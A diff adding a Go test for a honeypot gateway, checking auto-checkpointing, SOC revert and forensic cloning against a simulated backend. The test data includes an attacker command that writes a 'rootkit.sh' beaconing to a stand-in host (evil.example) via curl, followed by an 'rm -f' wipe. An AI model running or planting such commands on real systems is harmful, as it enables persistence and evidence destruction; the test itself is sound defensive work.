@@ -198,3 +198,87 @@ func TestHoneypotBackendLifecycleRevertAndClone(t *testing.T) {
 		t.Fatalf("expected PodIPHistory length >= 2 after suspend + wakeup migration, got %v", migratedForensics.PodIPHistory)
 	}
 }
+
+func TestHoneypotGatewayAutoCheckpointRevertAndClone(t *testing.T) {
+	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
+	gw := NewGatewayServer(backend)
+	srv := httptest.NewServer(gw.Mux())
+	defer srv.Close()
+
+	// 1. Verify GET / returns Split-Screen Truman Show HTML UI
+	respUI, err := http.Get(srv.URL + "/")
+	if err != nil {
+		t.Fatalf("GET /: %v", err)
+	}
+	defer respUI.Body.Close()
+	if respUI.StatusCode != http.StatusOK {
+		t.Fatalf("GET / status = %d", respUI.StatusCode)
+	}
+
+	// 2. Plant rootkit.sh via /api/attacker/exec -> triggers Auto-Checkpoint!
+	execBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"printf '#!/bin/sh\ncurl -s https://evil.example/beacon\n' > rootkit.sh && chmod +x rootkit.sh && ls -la"}`
+	respExec, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(execBody))
+	if err != nil {
+		t.Fatalf("POST /api/attacker/exec: %v", err)
+	}
+	defer respExec.Body.Close()
+	var execResult GatewayActionResponse
+	if err := json.NewDecoder(respExec.Body).Decode(&execResult); err != nil {
+		t.Fatalf("decode execResult: %v", err)
+	}
+	if !execResult.AutoCheckpointed || execResult.SnapshotVersion < 2 {
+		t.Fatalf("expected AutoCheckpointed=true and SnapshotVersion>=2, got %+v", execResult)
+	}
+	savedVer := execResult.SnapshotVersion
+
+	// 3. Attacker runs rm -f rootkit.sh -> should NOT overwrite the pre-wipe checkpoint
+	wipeBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"rm -f rootkit.sh"}`
+	respWipe, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(wipeBody))
+	if err != nil {
+		t.Fatalf("POST /api/attacker/exec wipe: %v", err)
+	}
+	defer respWipe.Body.Close()
+	var wipeResult GatewayActionResponse
+	if err := json.NewDecoder(respWipe.Body).Decode(&wipeResult); err != nil {
+		t.Fatalf("decode wipeResult: %v", err)
+	}
+	if wipeResult.AutoCheckpointed {
+		t.Fatalf("expected AutoCheckpointed=false on destructive rm command")
+	}
+
+	// 4. SOC calls /api/soc/revert to undo rm -f and recover rootkit.sh
+	revertBody := `{"actor_name":"honeypot-203-0-113-5","target_version":` + strings.TrimSpace(jsonNumber(savedVer)) + `}`
+	respRev, err := http.Post(srv.URL+"/api/soc/revert", "application/json", strings.NewReader(revertBody))
+	if err != nil {
+		t.Fatalf("POST /api/soc/revert: %v", err)
+	}
+	defer respRev.Body.Close()
+	var revResult GatewayActionResponse
+	if err := json.NewDecoder(respRev.Body).Decode(&revResult); err != nil {
+		t.Fatalf("decode revResult: %v", err)
+	}
+	if _, ok := revResult.Forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
+		t.Fatalf("expected rootkit.sh restored after /api/soc/revert, got %v", revResult.Forensics.FilesInRootfsTmp)
+	}
+
+	// 5. SOC calls /api/soc/clone to fork honeypot-forensic-lab
+	cloneBody := `{"source_actor":"honeypot-203-0-113-5","new_actor":"honeypot-forensic-lab"}`
+	respClone, err := http.Post(srv.URL+"/api/soc/clone", "application/json", strings.NewReader(cloneBody))
+	if err != nil {
+		t.Fatalf("POST /api/soc/clone: %v", err)
+	}
+	defer respClone.Body.Close()
+	var cloneResult GatewayActionResponse
+	if err := json.NewDecoder(respClone.Body).Decode(&cloneResult); err != nil {
+		t.Fatalf("decode cloneResult: %v", err)
+	}
+	if _, ok := cloneResult.Forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
+		t.Fatalf("expected rootkit.sh in cloned forensic lab actor")
+	}
+}
+
+func jsonNumber(n int) string {
+	b, _ := json.Marshal(n)
+	return string(b)
+}
+
